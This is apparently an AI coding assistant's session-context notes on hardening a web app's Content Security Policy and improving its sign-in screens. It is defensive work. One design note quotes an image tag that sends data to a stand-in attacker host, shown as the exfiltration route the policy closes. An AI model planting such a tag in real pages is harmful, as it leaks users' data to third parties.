# Previous Session Context

Claude writes to this file when the developer says **"Remember Session"** — capturing enough context for a future session to pick up the train of thought quickly. This is separate from "Reminders for Developer" (REMINDERS.md), which is the developer's own notes.

## Latest Session

**Date:** 2026-03-16 02:58:41 PM EST
**Repo version:** v04.28r

### What was done
- **v04.16r–v04.22r** — CSP hardening based on deep analysis of offensive security test 08 results:
  - Added `form-action 'self'` to block form-based data exfiltration
  - Added `default-src 'none'` (deny-all fallback), `worker-src 'none'`, `manifest-src 'none'`, `upgrade-insecure-requests`
  - Restricted `img-src` from blanket `https:` to specific trusted domains (closes image-based exfiltration)
  - Fixed regressions: added logo domains to `img-src`, added `media-src 'self'` for splash sounds
  - Fixed test 08 false pass (form-action test checked attribute values instead of actual submission blocking)
  - Fixed misleading eval() message (unsafe-inline does NOT allow eval — they are independent CSP keywords)
  - Removed dead `navigate-to` directive from test recommendations (dropped from CSP spec)
- **v04.23r** — Added "Reconnecting… Verifying your session" auth wall state for page reloads and tab reclaims (instead of confusing "Sign In Required" flash)
- **v04.24r** — Fixed sign-in page centering (broken by wrapper div), added "Signing in… Setting up your session" intermediate screen between Google account selection and GAS app load
- **v04.25r** — Added tab count to "Session Active Elsewhere" overlay using BroadcastChannel heartbeat
- **v04.26r** — Refactored tab count from continuous heartbeat to on-demand roll call (zero background overhead)
- **v04.27r** — Added spinner animation to signing-in and reconnecting screens
- **v04.28r** — Distinct animations: spinning ring for "Signing in…", pulsing dots for "Reconnecting…"

### Where we left off
All CSP hardening complete. Auth wall UX improvements deployed:
- Three auth wall states: "Sign In Required" (default), "Signing in…" (spinner, during Google auth), "Reconnecting…" (pulse dots, on reload/tab reclaim)
- Tab count in takeover overlay uses on-demand roll call (no continuous heartbeat)
- SECURITY-FINDINGS.md updated with comprehensive test 08 results (CSP Audit Findings + Attack Results tables, FIXED/ACCEPTED/UNFIXABLE categorization)

### Key technical context
- **Current CSP**: `default-src 'none'; script-src 'self' 'unsafe-inline' https://accounts.google.com/gsi/client https://apis.google.com; connect-src 'self' https://accounts.google.com/gsi/ https://www.googleapis.com https://api.ipify.org; frame-src https://accounts.google.com/gsi/ https://script.google.com https://*.googleusercontent.com; style-src 'self' 'unsafe-inline' https://accounts.google.com/gsi/style; img-src 'self' data: https://*.googleusercontent.com https://www.shadowaisolutions.com https://logoipsum.com; object-src 'none'; base-uri 'self'; form-action 'self'; media-src 'self'; worker-src 'none'; manifest-src 'none'; upgrade-insecure-requests;`
- **Auth wall states**: `showAuthWall()` (sign-in UI), `showReconnecting()` (pulse dots), `showSigningIn()` (spinner) — all three manage visibility of `auth-wall-signin`, `auth-wall-reconnecting`, `auth-wall-signing-in` divs
- **Tab roll call**: `startTabRollCall()` → broadcasts `tab-roll-call` → other tabs respond with `tab-present` → `updateTakeoverTabCount()` updates overlay text. No intervals, no pruning
- **`frame-ancestors` limitation**: CSP meta tags cannot set `frame-ancestors` (ignored per W3C spec). Must be HTTP header. `default-src 'none'` also does NOT prevent framing — this is a known accepted limitation
- **`unsafe-inline` vs `unsafe-eval`**: completely independent CSP keywords. `unsafe-inline` does NOT implicitly allow eval()

### Key decisions made
- CSP `img-src` restricted to specific domains rather than blanket `https:` — closes exfiltration via `<img src="https://evil.com/steal?data=...">`
- `default-src 'none'` as deny-all fallback for any resource type not explicitly listed
- Tab count uses on-demand roll call (not continuous heartbeat) — count is only needed when takeover overlay appears
- Tab count shown only in takeover overlay, not as a persistent UI element — avoids clutter for a rare event
- "Reconnecting…" uses pulse dots, "Signing in…" uses spinner — distinct animations convey different states

### Active context
- Repo version: v04.28r
- testauth1.html: v02.11w, testauth1.gs: v01.45g
- portal.html: v01.11w, portal.gs: v01.03g
- TODO items: Get mayo, Get lettuce, Get sliced turkey, Get mustard, Get pickles
- No active reminders
- `TEMPLATE_DEPLOY` = `On`, `CHAT_BOOKENDS` = `On`, `END_OF_RESPONSE_BLOCK` = `On`
- `MULTI_SESSION_MODE` = `Off`

## Previous Sessions

**Date:** 2026-03-16 12:10:39 PM EST
**Repo version:** v04.15r

### What was done
- **v04.02r–v04.08r** — Built 4 offensive security test suites using Playwright (Python, sync API)
- **v04.09r** — Fixed real vulnerabilities found by tests (session fixation, duplicate session overwrite, cross-tab storage sync)
- **v04.10r–v04.15r** — Security Event Reporter, rate limiting, FUTURE-CONSIDERATIONS.md, quota verification rule

Developed by: ShadowAISolutions
